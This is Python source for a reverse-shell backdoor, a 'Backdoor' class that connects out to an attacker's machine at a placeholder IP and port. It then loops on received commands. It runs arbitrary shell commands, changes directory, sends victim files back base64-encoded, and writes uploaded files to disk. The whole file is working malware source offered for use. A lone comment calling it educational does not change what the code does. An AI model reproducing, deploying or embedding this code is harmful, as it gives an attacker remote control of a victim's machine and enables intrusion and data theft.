import socket
import subprocess
import json
import os 
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        try:
            # Convert bytes to string if needed
            if isinstance(data, bytes):
                data = data.decode('utf-8', errors='replace')
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
        except Exception as e:
            print(f"[!] Error in reliable_send: {e}")

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                chunk = self.connection.recv(4096).decode()
                if not chunk:
                    break
                json_data += chunk
                try:
                    return json.loads(json_data)
                except json.JSONDecodeError:
                    continue
            except json.JSONDecodeError as e:
                print(f"[!] JSON decode error: {e}")
                continue
            except Exception as e:
                print(f"[!] Connection error: {e}")
                break
        return None
    def execute_system_command(self, command):
        try:
            # Log the command being executed (for educational purposes)
            print(f"[*] Executing: {' '.join(command) if isinstance(command, list) else command}")
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            error_output = e.output.decode() if e.output else "No output"
            return f"Command failed: {error_output}".encode()
    def change_working_directory(self, path):
        try:
            os.chdir(path)
            return f"Changed directory to {path}\n".encode()
        except FileNotFoundError as e:
            return f"Directory not found: {e}\n".encode()
        except Exception as e:
            return f"Error changing directory: {e}\n".encode()


    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except FileNotFoundError:
            return f"[!] File not found: {path}"
        except PermissionError:
            return f"[!] Permission denied: {path}"
        except Exception as e:
            return f"[!] Error reading file: {e}"

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
            return "File uploaded successfully\n".encode()
        except Exception as e:
            return f"[!] Error writing file: {e}\n".encode()

    def run(self):
        while True:
            # Guard against receive errors or lost connection
            try:
                command = self.reliable_receive()
                if command is None:
                    print("[!] Connection lost")
                    break
            except Exception as e:
                print(f"[!] Error receiving command: {e}")
                break

            # Validate and dispatch command
            try:
                if not command or len(command) < 1:
                    command_result = "[!] Invalid command received\n".encode()
                elif command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download" and len(command) > 1:
                    command_result = self.read_file(command[1])
                elif command[0] == "upload" and len(command) > 2:
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = f"[!] Error: {str(e)}\n".encode()

            # Guard against send failures
            try:
                self.reliable_send(command_result)
            except Exception as e:
                print(f"[!] Error sending result: {e}")
                break


my_backdoor = Backdoor("Enter hacker machine's ip here", "Enter port number here as integer")
my_backdoor.run()
